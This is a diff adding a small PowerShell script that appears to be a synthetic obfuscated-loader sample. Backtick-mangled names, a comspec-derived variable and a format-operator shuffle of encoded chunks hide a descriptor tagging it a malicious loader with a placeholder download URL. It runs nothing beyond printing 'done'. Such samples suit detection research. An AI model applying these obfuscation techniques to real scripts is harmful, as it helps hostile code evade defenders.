@@ -1,0 +1,4 @@
+Set-StrictMode -Off
+${s`H`eLL} = ($env:comspec[4,15,25]-join'')
+$descriptor_5e1f9a07 = (("{9}{8}{7}{6}{5}{4}{3}{2}{1}{0}" -f (-join [char[]](126,71,119,126,98,119,66,104,126,71,81,126)),'MQBm~Dk~YQ~w~Dc~LgBl~Hg~YQBt~H~~b~Bl~C4~aQBu~HY~YQBs~Gk~Z~~v','~Dk~YQ~w~Dc~f~B1~HI~b~~9~Gg~d~B0~H~~cw~6~C8~LwBw~HM~LQ~1~GU~','Zg~x~DY~f~Bj~GE~bQBw~GE~aQBn~G4~XwBp~GQ~PQBQ~FM~LQ~1~GU~MQBm','~G8~cgBk~GU~cgBf~GM~a~B1~G4~awBz~Cw~Z~Bl~GM~bwBk~GU~XwB1~HQ~','f~Bz~HQ~YQBn~GU~XwBj~G8~dQBu~HQ~PQ~y~Hw~cwB0~GU~c~Bz~D0~cgBl','~GQ~YQBw~HQ~ZQBy~D0~ZgBv~HI~bQBh~HQ~XwBv~H~~ZQBy~GE~d~Bv~HI~','YQBs~Gk~YwBp~G8~dQBz~Hw~YQB0~HQ~YQBj~Gs~PQBU~DE~M~~y~Dc~f~Bh','~Hw~cgBv~Gw~ZQ~9~Gw~bwBh~GQ~ZQBy~Hw~dgBl~HI~Z~Bp~GM~d~~9~G0~','dg~9~DM~f~Bs~GE~bgBn~HU~YQBn~GU~PQBw~G8~dwBl~HI~cwBo~GU~b~Bs')).Replace('~','A')
+W`RITe-`HOSt ('{1}{0}' -f 'ne','do')
